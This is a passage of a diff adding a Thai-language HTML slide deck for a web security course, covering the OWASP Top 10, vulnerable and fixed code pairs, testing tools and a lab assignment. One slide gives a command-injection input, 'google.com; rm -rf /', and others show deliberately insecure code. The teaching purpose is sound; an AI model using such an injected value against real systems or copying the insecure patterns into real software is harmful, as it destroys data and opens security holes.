+                <h3>Security Misconfiguration</h3>
+                <p>การกำหนดค่าผิดพลาด</p>
+            </div>
+            <div class="vulnerability-card">
+                <div class="owasp-ranking">A06</div>
+                <h3>Vulnerable Components</h3>
+                <p>ส่วนประกอบที่มีช่องโหว่</p>
+            </div>
+            <div class="vulnerability-card">
+                <div class="owasp-ranking">A07</div>
+                <h3>Authentication Failures</h3>
+                <p>ความล้มเหลวในการยืนยันตัวตน</p>
+            </div>
+            <div class="vulnerability-card">
+                <div class="owasp-ranking">A08</div>
+                <h3>Data Integrity Failures</h3>
+                <p>ความล้มเหลวในความสมบูรณ์ข้อมูล</p>
+            </div>
+            <div class="vulnerability-card">
+                <div class="owasp-ranking">A09</div>
+                <h3>Logging & Monitoring Failures</h3>
+                <p>ความล้มเหลวในการบันทึกและติดตาม</p>
+            </div>
+            <div class="vulnerability-card">
+                <div class="owasp-ranking">A10</div>
+                <h3>Server-Side Request Forgery</h3>
+                <p>การปลอมแปลงคำขอฝั่งเซิร์ฟเวอร์</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Slide 23: A01 Broken Access Control -->
+    <div class="slide">
+        <h2>A01: Broken Access Control</h2>
+        <div class="vulnerability-card">
+            <div class="owasp-ranking">A01:2021</div>
+            <h3>🚪 การควบคุมการเข้าถึงที่มีปัญหา</h3>
+            <p>ผู้ใช้สามารถเข้าถึงข้อมูลหรือฟังก์ชันที่ไม่ได้รับอนุญาต</p>
+        </div>
+        <div class="warning">
+            <h3>⚠️ ตัวอย่างการโจมตี</h3>
+            <ul>
+                <li>เปลี่ยน URL เพื่อเข้าถึงข้อมูลของผู้อื่น</li>
+                <li>การ Privilege Escalation</li>
+                <li>การเข้าถึง API ที่ไม่ได้รับอนุญาต</li>
+                <li>การ Bypass Access Control</li>
+                <li>การแก้ไข metadata หรือ JWT tokens</li>
+            </ul>
+        </div>
+        <div class="code-example">
+            <h3>❌ Vulnerable Code:</h3>
+            <pre>
+// ไม่มีการตรวจสอบสิทธิ์
+app.get('/user/:id/profile', (req, res) => {
+    const userId = req.params.id;
+    const user = getUserById(userId);
+    res.json(user);
+});
+
+// URL: /user/123/profile สามารถเข้าถึงโปรไฟล์ของใครก็ได้
+            </pre>
+        </div>
+        <div class="code-example">
+            <h3>✅ Secure Code:</h3>
+            <pre>
+// ตรวจสอบสิทธิ์ก่อนเข้าถึงข้อมูล
+app.get('/user/:id/profile', authenticateToken, (req, res) => {
+    const userId = req.params.id;
+    const currentUserId = req.user.id;
+    
+    if (userId !== currentUserId && !req.user.isAdmin) {
+        return res.status(403).json({ error: 'Access denied' });
+    }
+    
+    const user = getUserById(userId);
+    res.json(user);
+});
+            </pre>
+        </div>
+    </div>
+
+    <!-- Slide 24: A02 Cryptographic Failures -->
+    <div class="slide">
+        <h2>A02: Cryptographic Failures</h2>
+        <div class="vulnerability-card">
+            <div class="owasp-ranking">A02:2021</div>
+            <h3>🔐 ความล้มเหลวในการเข้ารหัส</h3>
+            <p>การใช้งานการเข้ารหัสที่ไม่เหมาะสมหรือไม่มีการเข้ารหัสเลย</p>
+        </div>
+        <div class="vulnerability-types">
+            <div class="warning">
+                <h3>⚠️ ปัญหาที่พบบ่อย</h3>
+                <ul>
+                    <li>เก็บรหัสผ่านแบบ plaintext</li>
+                    <li>ใช้ encryption algorithm ที่เก่า</li>
+                    <li>การส่งข้อมูลผ่าน HTTP แทน HTTPS</li>
+                    <li>การใช้ Default encryption keys</li>
+                    <li>ใช้ weak hashing functions (MD5, SHA1)</li>
+                </ul>
+            </div>
+            <div class="best-practice">
+                <h3>✅ การป้องกัน</h3>
+                <ul>
+                    <li>ใช้ HTTPS สำหรับการส่งข้อมูล</li>
+                    <li>Hash รหัสผ่านด้วย bcrypt, scrypt, Argon2</li>
+                    <li>ใช้ strong encryption algorithms</li>
+                    <li>จัดการ encryption keys อย่างปลอดภัย</li>
+                    <li>ไม่เก็บข้อมูลสำคัญแบบ plaintext</li>
+                </ul>
+            </div>
+        </div>
+        <div class="code-example">
+            <h3>❌ Vulnerable:</h3>
+            <pre>
+// เก็บรหัสผ่านแบบ plaintext
+const user = {
+    username: 'john',
+    password: 'mypassword123'  // ❌ ไม่ปลอดภัย
+};
+
+// ส่งข้อมูลผ่าน HTTP
+fetch('http://api.example.com/login', {
+    method: 'POST',
+    body: JSON.stringify(credentials)
+});
+            </pre>
+        </div>
+        <div class="code-example">
+            <h3>✅ Secure:</h3>
+            <pre>
+const bcrypt = require('bcrypt');
+
+// Hash รหัสผ่านก่อนเก็บ
+const hashedPassword = await bcrypt.hash('mypassword123', 10);
+const user = {
+    username: 'john',
+    password: hashedPassword  // ✅ ปลอดภัย
+};
+
+// ส่งข้อมูลผ่าน HTTPS
+fetch('https://api.example.com/login', {
+    method: 'POST',
+    body: JSON.stringify(credentials)
+});
+            </pre>
+        </div>
+    </div>
+
+    <!-- Slide 25: A03 Injection -->
+    <div class="slide">
+        <h2>A03: Injection</h2>
+        <div class="vulnerability-card">
+            <div class="owasp-ranking">A03:2021</div>
+            <h3>💉 การฉีดคำสั่ง</h3>
+            <p>การส่งข้อมูลที่ไม่ถูกต้องเพื่อให้แอปพลิเคชันรันคำสั่งที่ไม่ต้องการ</p>
+        </div>
+        <div class="vulnerability-types">
+            <div class="vulnerability-card">
+                <h3>🗃️ SQL Injection</h3>
+                <p>ฉีดคำสั่ง SQL ผ่าน input</p>
+            </div>
+            <div class="vulnerability-card">
+                <h3>📄 NoSQL Injection</h3>
+                <p>ฉีดคำสั่งใน NoSQL databases</p>
+            </div>
+            <div class="vulnerability-card">
+                <h3>💻 OS Command Injection</h3>
+                <p>ฉีดคำสั่งระบบปฏิบัติการ</p>
+            </div>
+            <div class="vulnerability-card">
+                <h3>📧 LDAP Injection</h3>
+                <p>ฉีดคำสั่ง LDAP queries</p>
+            </div>
+        </div>
+        <div class="code-example">
+            <h3>❌ OS Command Injection:</h3>
+            <pre>
+// Node.js - Vulnerable to command injection
+const { exec } = require('child_process');
+
+app.post('/ping', (req, res) => {
+    const host = req.body.host;
+    exec(`ping -c 4 ${host}`, (error, stdout) => {
+        res.send(stdout);
+    });
+});
+
+// Malicious input: "google.com; rm -rf /"
+            </pre>
+        </div>
+        <div class="code-example">
+            <h3>✅ Secure Version:</h3>
+            <pre>
+const { spawn } = require('child_process');
+
+app.post('/ping', (req, res) => {
+    const host = req.body.host;
+    
+    // Validate input
+    if (!/^[a-zA-Z0-9.-]+$/.test(host)) {
+        return res.status(400).send('Invalid host format');
+    }
+    
+    const ping = spawn('ping', ['-c', '4', host]);
+    let output = '';
+    
+    ping.stdout.on('data', (data) => {
+        output += data;
+    });
+    
+    ping.on('close', () => {
+        res.send(output);
+    });
+});
+            </pre>
+        </div>
+    </div>
+
+    <!-- Slide 26: A04 Insecure Design -->
+    <div class="slide">
+        <h2>A04: Insecure Design</h2>
+        <div class="vulnerability-card">
+            <div class="owasp-ranking">A04:2021</div>
+            <h3>🏗️ การออกแบบที่ไม่ปลอดภัย</h3>
+            <p>ข้อบกพร่องในการออกแบบระบบที่ไม่สามารถแก้ไขด้วยการ implement ที่ดีได้</p>
+        </div>
+        <div class="vulnerability-types">
+            <div class="warning">
+                <h3>⚠️ ปัญหาในการออกแบบ</h3>
+                <ul>
+                    <li>ไม่มี Threat Modeling</li>
+                    <li>ไม่คิดถึง Security Requirements</li>
+                    <li>ไม่มี Defense in Depth</li>
+                    <li>ไม่ได้ทำ Security by Design</li>
+                    <li>ไม่มีการควบคุม Business Logic</li>
+                </ul>
+            </div>
+            <div class="best-practice">
+                <h3>✅ Secure Design Principles</h3>
+                <ul>
+                    <li>Threat Modeling ในช่วงการออกแบบ</li>
+                    <li>Principle of Least Privilege</li>
+                    <li>Defense in Depth</li>
+                    <li>Fail Secure (แม้เกิดข้อผิดพลาดก็ปลอดภัย)</li>
+                    <li>Zero Trust Architecture</li>
+                </ul>
+            </div>
+        </div>
+        <div class="highlight">
+            <h3>📝 ตัวอย่างสถานการณ์</h3>
+            <p><strong>ปัญหา:</strong> ระบบ E-commerce ไม่มีการจำกัดจำนวนคูปองส่วนลดที่ใช้ได้</p>
+            <p><strong>ผลกระทบ:</strong> ผู้ใช้สามารถใช้คูปองเดียวกันได้หลายครั้ง ทำให้ร้านขาดทุน</p>
+            <p><strong>วิธีแก้:</strong> ออกแบบระบบให้มีการตรวจสอบและจำกัดการใช้คูปอง พร้อม rate limiting</p>
+        </div>
+    </div>
+
+    <!-- Slide 27: A05 Security Misconfiguration -->
+    <div class="slide">
+        <h2>A05: Security Misconfiguration</h2>
+        <div class="vulnerability-card">
+            <div class="owasp-ranking">A05:2021</div>
+            <h3>⚙️ การกำหนดค่าความปลอดภัยผิดพลาด</h3>
+            <p>การตั้งค่าระบบ, เฟรมเวิร์ก, หรือไลบรารีที่ไม่ปลอดภัย</p>
+        </div>
+        <div class="vulnerability-types">
+            <div class="warning">
+                <h3>⚠️ ปัญหาที่พบบ่อย</h3>
+                <ul>
+                    <li>ใช้รหัสผ่าน default</li>
+                    <li>เปิดใช้งาน feature ที่ไม่จำเป็น</li>
+                    <li>แสดง error message รายละเอียด</li>
+                    <li>ไม่อัปเดต security patches</li>
+                    <li>การตั้งค่า CORS ที่ไม่ปลอดภัย</li>
+                </ul>
+            </div>
+            <div class="best-practice">
+                <h3>✅ การป้องกัน</h3>
+                <ul>
+                    <li>ใช้ Security Hardening Guidelines</li>
+                    <li>ปิดการใช้งาน features ที่ไม่ต้องการ</li>
+                    <li>ตรวจสอบการตั้งค่าอย่างสม่ำเสมอ</li>
+                    <li>ใช้ automated configuration scanning</li>
+                </ul>
+            </div>
+        </div>
+        <div class="code-example">
+            <h3>❌ Insecure CORS Configuration:</h3>
+            <pre>
+// Express.js - อันตราย: อนุญาตทุก origin
+app.use(cors({
+    origin: '*',
+    credentials: true
+}));
+
+// เปิด debug mode ใน production
+app.set('env', 'development');
+            </pre>
+        </div>
+        <div class="code-example">
+            <h3>✅ Secure CORS Configuration:</h3>
+            <pre>
+// Express.js - ปลอดภัย: กำหนด origin ที่เฉพาะเจาะจง
+app.use(cors({
+    origin: ['https://myapp.com', 'https://www.myapp.com'],
+    credentials: true,
+    optionsSuccessStatus: 200
+}));
+
+// ปิด debug mode ใน production
+if (process.env.NODE_ENV === 'production') {
+    app.set('env', 'production');
+}
+            </pre>
+        </div>
+    </div>
+
+    <!-- Slide 28: A06-A10 Quick Overview -->
+    <div class="slide">
+        <h2>A06-A10: Quick Overview</h2>
+        <div class="vulnerability-types">
+            <div class="vulnerability-card">
+                <div class="owasp-ranking">A06</div>
+                <h3>Vulnerable Components</h3>
+                <p><strong>ปัญหา:</strong> ใช้ library ที่มีช่องโหว่</p>
+                <p><strong>ตัวอย่าง:</strong> Log4Shell (Log4j), Struts</p>
+                <p><strong>วิธีแก้:</strong> ใช้ dependency scanning tools</p>
+            </div>
+            <div class="vulnerability-card">
+                <div class="owasp-ranking">A07</div>
+                <h3>Authentication Failures</h3>
+                <p><strong>ปัญหา:</strong> การยืนยันตัวตนที่อ่อนแอ</p>
+                <p><strong>ตัวอย่าง:</strong> Weak passwords, session hijacking</p>
+                <p><strong>วิธีแก้:</strong> MFA, strong session management</p>
+            </div>
+            <div class="vulnerability-card">
+                <div class="owasp-ranking">A08</div>
+                <h3>Data Integrity Failures</h3>
+                <p><strong>ปัญหา:</strong> ไม่ verify integrity ของข้อมูล</p>
+                <p><strong>ตัวอย่าง:</strong> Malicious software updates</p>
+                <p><strong>วิธีแก้:</strong> Digital signatures, checksums</p>
+            </div>
+            <div class="vulnerability-card">
+                <div class="owasp-ranking">A09</div>
+                <h3>Logging & Monitoring Failures</h3>
+                <p><strong>ปัญหา:</strong> ไม่มี logging ที่เพียงพอ</p>
+                <p><strong>ตัวอย่าง:</strong> ไม่สามารถตรวจจับการโจมตีได้</p>
+                <p><strong>วิธีแก้:</strong> Comprehensive logging, real-time monitoring</p>
+            </div>
+            <div class="vulnerability-card">
+                <div class="owasp-ranking">A10</div>
+                <h3>Server-Side Request Forgery</h3>
+                <p><strong>ปัญหา:</strong> Server ทำการ request ตาม input ของ user</p>
+                <p><strong>ตัวอย่าง:</strong> เข้าถึง internal services</p>
+                <p><strong>วิธีแก้:</strong> Input validation, network segmentation</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Security Testing Tools Section Starts Here -->
+    
+    <!-- Slide 29: Security Testing Tools Introduction -->
+    <div class="slide">
+        <h1>Security Testing Tools</h1>
+        <div class="vulnerability-card">
+            <h3>🧪 การทดสอบความปลอดภัย</h3>
+            <p>เครื่องมือและเทคนิคสำหรับการค้นหาและประเมินช่องโหว่ในแอปพลิเคชัน</p>
+        </div>
+        <div class="vulnerability-types">
+            <div class="tool-category">
+                <h3>📊 SAST</h3>
+                <p><strong>Static Application Security Testing</strong></p>
+                <p>วิเคราะห์ source code โดยไม่ต้องรันโปรแกรม</p>
+            </div>
+            <div class="tool-category">
+                <h3>🔍 DAST</h3>
+                <p><strong>Dynamic Application Security Testing</strong></p>
+                <p>ทดสอบแอปพลิเคชันขณะที่กำลังทำงาน</p>
+            </div>
+            <div class="tool-category">
+                <h3>🔬 IAST</h3>
+                <p><strong>Interactive Application Security Testing</strong></p>
+                <p>รวม SAST และ DAST เข้าด้วยกัน</p>
+            </div>
+            <div class="tool-category">
+                <h3>📦 SCA</h3>
+                <p><strong>Software Composition Analysis</strong></p>
+                <p>ตรวจสอบช่องโหว่ใน dependencies</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Slide 30: OWASP ZAP -->
+    <div class="slide">
+        <h2>OWASP ZAP (Zed Attack Proxy)</h2>
+        <div class="vulnerability-card">
+            <h3>🕷️ เครื่องมือ DAST ที่ได้รับความนิยม</h3>
+            <p>Free, open-source web application security scanner</p>
+        </div>
+        <div class="vulnerability-types">
+            <div class="best-practice">
+                <h3>✅ คุณสมบัติหลัก</h3>
+                <ul>
+                    <li>Automated Security Scanning</li>
+                    <li>Manual Testing Support</li>
+                    <li>Active และ Passive Scanning</li>
+                    <li>API Testing</li>
+                    <li>CI/CD Integration</li>
+                    <li>Extensible with Add-ons</li>
+                </ul>
+            </div>
+            <div class="vulnerability-card">
+                <h3>🎯 การใช้งาน</h3>
+                <ol>
+                    <li>ตั้งค่า Proxy ในเบราว์เซอร์</li>
+                    <li>Browse ผ่านแอปพลิเคชัน</li>
+                    <li>รัน Active Scan</li>
+                    <li>ตรวจสอบผลลัพธ์</li>
+                    <li>Manual Testing เพิ่มเติม</li>
+                </ol>
+            </div>
+        </div>
+        <div class="code-example">
+            <h3>🖥️ ZAP Command Line:</h3>
+            <pre>
+# Quick scan
+zap-baseline.py -t https://example.com
+
+# Full scan with report
+zap-full-scan.py -t https://example.com -r zap-report.html
+
+# API scan
+zap-api-scan.py -t https://api.example.com/openapi.json
+
+# Docker usage
+docker run -v $(pwd):/zap/wrk/:rw -t owasp/zap2docker-stable \
+    zap-baseline.py -t https://example.com -g gen.conf -r testreport.html
+            </pre>
+        </div>
+    </div>
+
+    <!-- Slide 31: Burp Suite -->
+    <div class="slide">
+        <h2>Burp Suite</h2>
+        <div class="vulnerability-card">
+            <h3>🔧 เครื่องมือ Security Testing ที่ครอบคลุม</h3>
+            <p>มี Community Edition (ฟรี) และ Professional Edition (เสียเงิน)</p>
+        </div>
+        <div class="vulnerability-types">
+            <div class="vulnerability-card">
+                <h3>🆓 Community Edition</h3>
+                <ul>
+                    <li>Proxy และ Intercept</li>
+                    <li>Manual Testing</li>
+                    <li>Basic Scanner (จำกัด)</li>
+                    <li>Repeater</li>
+                    <li>Decoder</li>
+                </ul>
+            </div>
+            <div class="vulnerability-card">
+                <h3>💰 Professional Edition</h3>
+                <ul>
+                    <li>Advanced Scanner</li>
+                    <li>Intruder (Automated Attacks)</li>
+                    <li>Extensions Support</li>
+                    <li>Detailed Reporting</li>
+                    <li>Collaborator</li>
+                </ul>
+            </div>
+        </div>
+        <div class="best-practice">
+            <h3>✅ การใช้งาน Burp Suite</h3>
+            <ol>
+                <li><strong>Proxy Setup:</strong> กำหนดเบราว์เซอร์ให้ใช้ Burp เป็น proxy (127.0.0.1:8080)</li>
+                <li><strong>Target Mapping:</strong> สำรวจโครงสร้างของแอปพลิเคชัน</li>
+                <li><strong>Manual Testing:</strong> ใช้ Repeater ทดสอบ requests</li>
+                <li><strong>Automated Scanning:</strong> รัน vulnerability scanner</li>
+                <li><strong>Exploitation:</strong> ใช้ Intruder สำหรับ advanced attacks</li>
+            </ol>
+        </div>
+    </div>
+
+    <!-- Slide 32: Static Analysis Tools -->
+    <div class="slide">
+        <h2>Static Analysis Tools (SAST)</h2>
+        <div class="vulnerability-types">
+            <div class="vulnerability-card">
+                <h3>🔍 SonarQube</h3>
+                <p><strong>ภาษา:</strong> Java, C#, JavaScript, Python, PHP</p>
+                <p><strong>คุณสมบัติ:</strong> Code quality + Security</p>
+                <p><strong>การใช้:</strong> CI/CD integration, Dashboard</p>
+            </div>
+            <div class="vulnerability-card">
+                <h3>🛡️ CodeQL (GitHub)</h3>
+                <p><strong>ภาษา:</strong> C/C++, C#, Java, JavaScript, Python</p>
+                <p><strong>คุณสมบัติ:</strong> Advanced semantic analysis</p>
+                <p><strong>การใช้:</strong> GitHub Actions, Custom queries</p>
+            </div>
+            <div class="vulnerability-card">
+                <h3>🔬 ESLint Security Plugin</h3>
+                <p><strong>ภาษา:</strong> JavaScript, TypeScript</p>
+                <p><strong>คุณสมบัติ:</strong> Real-time security checking</p>
+                <p><strong>การใช้:</strong> IDE integration, Build process</p>
+            </div>
+            <div class="vulnerability-card">
+                <h3>⚡ Semgrep</h3>
+                <p><strong>ภาษา:</strong> 20+ languages</p>
+                <p><strong>คุณสมบัติ:</strong> Custom rules, Fast scanning</p>
+                <p><strong>การใช้:</strong> CI/CD, Local development</p>
+            </div>
+        </div>
+        <div class="code-example">
+            <h3>🖥️ ตัวอย่างการใช้งาน:</h3>
+            <pre>
+# SonarQube Scanner
+sonar-scanner \
+  -Dsonar.projectKey=myproject \
+  -Dsonar.sources=src \
+  -Dsonar.host.url=http://localhost:9000
+
+# ESLint Security
+npm install --save-dev eslint-plugin-security
+# .eslintrc.js: plugins: ['security']
+
+# Semgrep
+semgrep --config=auto src/
+semgrep --config=p/owasp-top-ten src/
+            </pre>
+        </div>
+    </div>
+
+    <!-- Slide 33: Dependency Scanning Tools -->
+    <div class="slide">
+        <h2>Dependency Scanning Tools (SCA)</h2>
+        <div class="vulnerability-card">
+            <h3>📦 Software Composition Analysis</h3>
+            <p>ตรวจสอบช่องโหว่ใน third-party libraries และ dependencies</p>
+        </div>
+        <div class="vulnerability-types">
+            <div class="vulnerability-card">
+                <h3>🐍 Snyk</h3>
+                <p><strong>รองรับ:</strong> npm, pip, composer, Maven, Gradle</p>
+                <p><strong>คุณสมบัติ:</strong> Fix suggestions, License compliance</p>
+                <p><strong>ราคา:</strong> Free tier + Paid plans</p>
+            </div>
+            <div class="vulnerability-card">
+                <h3>🔍 OWASP Dependency-Check</h3>
+                <p><strong>รองรับ:</strong> Java, .NET, JavaScript, Python</p>
+                <p><strong>คุณสมบัติ:</strong> CVE database integration</p>
+                <p><strong>ราคา:</strong> Free และ Open Source</p>
+            </div>
+            <div class="vulnerability-card">
+                <h3>🛡️ GitHub Dependabot</h3>
+                <p><strong>รองรับ:</strong> ภาษาส่วนใหญ่</p>
+                <p><strong>คุณสมบัติ:</strong> Auto-updates, PR creation</p>
+                <p><strong>ราคา:</strong> Free สำหรับ public repos</p>
+            </div>
+            <div class="vulnerability-card">
+                <h3>📊 WhiteSource/Mend</h3>
+                <p><strong>รองรับ:</strong> 200+ programming languages</p>
+                <p><strong>คุณสมบัติ:</strong> Enterprise features, Policy enforcement</p>
+                <p><strong>ราคา:</strong> Enterprise solution</p>
+            </div>
+        </div>
+        <div class="code-example">
+            <h3>🖥️ ตัวอย่างการใช้งาน:</h3>
+            <pre>
+# Snyk CLI
+npm install -g snyk
+snyk test                    # Scan for vulnerabilities
+snyk monitor                 # Continuous monitoring
+snyk fix                     # Auto-fix vulnerabilities
+
+# OWASP Dependency-Check
+dependency-check.sh --project myproject --scan ./src
+
+# npm audit (built-in)
+npm audit                    # Show vulnerabilities
+npm audit fix                # Auto-fix when possible
+
+# GitHub Dependabot (configuration in .github/dependabot.yml)
+version: 2
+updates:
+  - package-ecosystem: "npm"
+    directory: "/"
+    schedule:
+      interval: "daily"
+            </pre>
+        </div>
+    </div>
+
+    <!-- Slide 34: Advanced Security Testing -->
+    <div class="slide">
+        <h2>Advanced Security Testing Techniques</h2>
+        <div class="vulnerability-types">
+            <div class="vulnerability-card">
+                <h3>🤖 Fuzzing</h3>
+                <p>ส่งข้อมูลแบบสุ่มเพื่อหาจุดผิดพลาด</p>
+                <ul>
+                    <li><strong>Tools:</strong> AFL, libFuzzer, Boofuzz</li>
+                    <li><strong>Target:</strong> API endpoints, File parsers</li>
+                    <li><strong>Benefits:</strong> ค้นหาช่องโหว่ที่ไม่คาดคิด</li>
+                </ul>
+            </div>
+            <div class="vulnerability-card">
+                <h3>🏰 Penetration Testing</h3>
+                <p>การทดสอบแบบจำลองการโจมตีจริง</p>
+                <ul>
+                    <li><strong>Phases:</strong> Recon, Scanning, Exploitation</li>
+                    <li><strong>Tools:</strong> Metasploit, Kali Linux</li>
+                    <li><strong>Benefits:</strong> ประเมินความเสี่ยงแบบองค์รวม</li>
+                </ul>
+            </div>
+            <div class="vulnerability-card">
+                <h3>🔍 Code Review</h3>
+                <p>การตรวจสอบ source code โดยมนุษย์</p>
+                <ul>
+                    <li><strong>Focus:</strong> Authentication, Authorization</li>
+                    <li><strong>Process:</strong> Peer review, Security review</li>
+                    <li><strong>Benefits:</strong> ตรวจหาปัญหา Logic flaws</li>
+                </ul>
+            </div>
+            <div class="vulnerability-card">
+                <h3>🌐 API Security Testing</h3>
+                <p>การทดสอบ REST/GraphQL APIs</p>
+                <ul>
+                    <li><strong>Tools:</strong> Postman, RestAssured, GraphQL Voyager</li>
+                    <li><strong>Tests:</strong> BOLA, Rate limiting, Input validation</li>
+                    <li><strong>Benefits:</strong> ครอบคลุม API endpoints</li>
+                </ul>
+            </div>
+        </div>
+        <div class="best-practice">
+            <h3>✅ Best Practices สำหรับ Security Testing</h3>
+            <ul>
+                <li><strong>Shift Left:</strong> ทดสอบความปลอดภัยตั้งแต่เริ่มพัฒนา</li>
+                <li><strong>Continuous Testing:</strong> รวมเข้า CI/CD pipeline</li>
+                <li><strong>Risk-Based Testing:</strong> มุ่งเน้นที่ high-risk areas</li>
+                <li><strong>Team Collaboration:</strong> ความร่วมมือระหว่าง Dev, Sec, Ops</li>
+            </ul>
+        </div>
+    </div>
+
+    <!-- Slide 35: Integration with CI/CD -->
+    <div class="slide">
+        <h2>การรวม Security Testing เข้า CI/CD</h2>
+        <div class="vulnerability-card">
+            <h3>🔄 DevSecOps Pipeline</h3>
+            <p>รวมการทดสอบความปลอดภัยเข้าไปในกระบวนการพัฒนา</p>
+        </div>
+        <div class="code-example">
+            <h3>🖥️ GitHub Actions Example:</h3>
+            <pre>
+name: Security Pipeline
+on: [push, pull_request]
+
+jobs:
+  security-tests:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v2
+      
+      # SAST - Static Analysis
+      - name: Run Semgrep
+        uses: semgrep/semgrep-action@v1
+        
+      # SCA - Dependency Check
+      - name: Run Snyk
+        uses: snyk/actions/node@master
+        env:
+          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
+          
+      # DAST - Dynamic Testing (staging)
+      - name: ZAP Baseline Scan
+        if: github.ref == 'refs/heads/main'
+        uses: zaproxy/action-baseline@v0.7.0
+        with:
+          target: 'https://staging.myapp.com'
+          
+      # Security Gates
+      - name: Security Gate
+        run: |
+          if [ "$SECURITY_ISSUES" -gt 0 ]; then
+            echo "Security issues found. Blocking deployment."
+            exit 1
+          fi
+            </pre>
+        </div>
+        <div class="vulnerability-types">
+            <div class="best-practice">
+                <h3>✅ Pipeline Security Gates</h3>
+                <ul>
+                    <li>หยุดการ deploy หากพบช่องโหว่ Critical/High</li>
+                    <li>สร้าง security reports</li>
+                    <li>แจ้งเตือนทีมผ่าน Slack/Email</li>
+                    <li>Track security metrics</li>
+                </ul>
+            </div>
+            <div class="warning">
+                <h3>⚠️ ข้อควรระวัง</h3>
+                <ul>
+                    <li>Balance security กับ speed of delivery</li>
+                    <li>ตั้งค่า threshold ที่เหมาะสม</li>
+                    <li>จัดการ false positives</li>
+                    <li>Training ทีมให้เข้าใจ security</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+    <!-- Final Lab Assignment -->
+    
+    <!-- Slide 36: Comprehensive Lab Assignment -->
+    <div class="slide">
+        <h2>Comprehensive Security Testing Lab</h2>
+        <div class="lab-section">
+            <h3>🔬 โปรเจคปฏิบัติการ: End-to-End Security Assessment</h3>
+            
+            <div class="vulnerability-card">
+                <h3>📋 รายละเอียดงาน</h3>
+                <p>ทำการประเมินความปลอดภัยแบบครอบคลุมสำหรับ Web Application รวมถึง OWASP Top 10 Testing</p>
+            </div>
+
+            <div class="best-practice">
+                <h3>📊 ขอบเขตงาน</h3>
+                <ol>
+                    <li><strong>Target Selection:</strong>
+                        <ul>
+                            <li>เลือก Web App: DVWA, OWASP Juice Shop, หรือโปรเจคตัวเอง</li>
+                            <li>ระบุขอบเขตการทดสอบ</li>
+                        </ul>
+                    </li>
+                    <li><strong>OWASP Top 10 Testing:</strong>
+                        <ul>
+                            <li>ทดสอบช่องโหว่ทั้ง 10 รายการ</li>
+                            <li>ใช้ automated tools (ZAP, Burp)</li>
+                            <li>ทำ manual testing</li>
+                        </ul>
+                    </li>
+                    <li><strong>Multi-layered Testing:</strong>
+                        <ul>
+                            <li>SAST: ใช้ SonarQube หรือ Semgrep</li>
+                            <li>DAST: ใช้ OWASP ZAP</li>
+                            <li>SCA: ใช้ Snyk หรือ Dependency-Check</li>
+                        </ul>
+                    </li>
+                    <li><strong>Risk Assessment:</strong>
+                        <ul>
+                            <li>CVSS Scoring สำหรับช่องโหว่ที่พบ</li>
+                            <li>Risk Matrix Analysis</li>
+                            <li>Business Impact Assessment</li>
+                        </ul>
+                    </li>
+                </ol>
+            </div>
+
+            <div class="highlight">
+                <h3>📑 Deliverables</h3>
+                <ol>
+                    <li><strong>Executive Summary</strong> (1-2 หน้า)</li>
+                    <li><strong>Technical Report</strong> (15-20 หน้า) ประกอบด้วย:
+                        <ul>
+                            <li>Methodology และ Tools ที่ใช้</li>
+                            <li>OWASP Top 10 Assessment Results</li>
+                            <li>รายการช่องโหว่ที่พบ พร้อม CVSS Score</li>
+                            <li>Proof of Concept (Screenshots, Videos)</li>
+                            <li>Risk Assessment และ Prioritization</li>
+                            <li>Remediation Recommendations</li>
+                        </ul>
+                    </li>
+                    <li><strong>แผนการแก้ไข</strong> พร้อมกำหนดเวลาและ Cost-Benefit Analysis</li>
+                    <li><strong>Demo Presentation</strong> (10-15 นาที)</li>
+                </ol>
+            </div>
+        </div>
+    </div>
+
+    <!-- Final Summary -->
+    
+    <!-- Slide 37: Final Summary -->
+    <div class="slide">
+        <h2>สรุปบทเรียนทั้งหมด</h2>
+        <div class="vulnerability-types">
+            <div class="highlight">
+                <h3>🎯 ความรู้ที่ได้รับ</h3>
+                <ul>
+                    <li><strong>Fundamentals:</strong> Vulnerabilities, CVE, Risk Assessment, CVSS</li>
+                    <li><strong>OWASP Top 10:</strong> ช่องโหว่ที่สำคัญที่สุด 10 อันดับ</li>
+                    <li><strong>Security Testing:</strong> SAST, DAST, SCA, IAST</li>
+                    <li><strong>Tools Mastery:</strong> ZAP, Burp Suite, SonarQube, Snyk</li>
+                    <li><strong>DevSecOps:</strong> การรวม Security เข้า CI/CD Pipeline</li>
+                    <li><strong>Practical Skills:</strong> การทำ Security Assessment จริง</li>
+                </ul>
+            </div>
+            <div class="best-practice">
+                <h3>🚀 การประยุกต์ใช้ในโลกจริง</h3>
+                <ul>
+                    <li>ใช้ OWASP Top 10 เป็น security checklist</li>
+                    <li>รวม security testing เข้า development lifecycle</li>
+                    <li>ใช้เครื่องมือ automated scanning ในทีม</li>
+                    <li>ทำ manual testing เป็นระยะ</li>
+                    <li>ติดตาม CVE updates อย่างสม่ำเสมอ</li>
+                    <li>สร้างวัฒนธรรม Security-First ในองค์กร</li>
+                </ul>
+            </div>
+        </div>
+        <div class="vulnerability-card">
+            <h3>📚 Resources สำหรับศึกษาต่อ</h3>
+            <ul>
+                <li><strong>OWASP:</strong> owasp.org (Top 10, Testing Guide, Code Review Guide)</li>
+                <li><strong>SANS:</strong> sans.org (Security training และ certification)</li>
+                <li><strong>CVE:</strong> cve.mitre.org (Vulnerability database)</li>
+                <li><strong>Practice Labs:</strong> DVWA, WebGoat, Juice Shop, PortSwigger Academy</li>
+                <li><strong>Communities:</strong> r/netsec, Security Twitter, OWASP Local Chapters</li>
+                <li><strong>Certifications:</strong> CEH, OSCP, CISSP, Security+</li>
+            </ul>
+        </div>
+        <div style="margin-top: 40px;">
+            <h3>🎉 ขอบคุณและพร้อมสู่การเป็น Security Champion!</h3>
+            <p style="font-size: 1.5em;">💪 Security is Everyone's Responsibility 🛡️</p>
+        </div>
+    </div>
+
+    <div class="navigation">
+        <button class="nav-btn" onclick="previousSlide()">◀ Previous</button>
+        <button class="nav-btn" onclick="nextSlide()">Next ▶</button>
+    </div>
+
+    <script>
+        let currentSlide = 0;
+        const slides = document.querySelectorAll('.slide');
+        const totalSlides = slides.length;
+        
+        document.getElementById('total-slides').textContent = totalSlides;
+
+        function showSlide(n) {
+            slides[currentSlide].classList.remove('active');
+            currentSlide = (n + totalSlides) % totalSlides;
+            slides[currentSlide].classList.add('active');
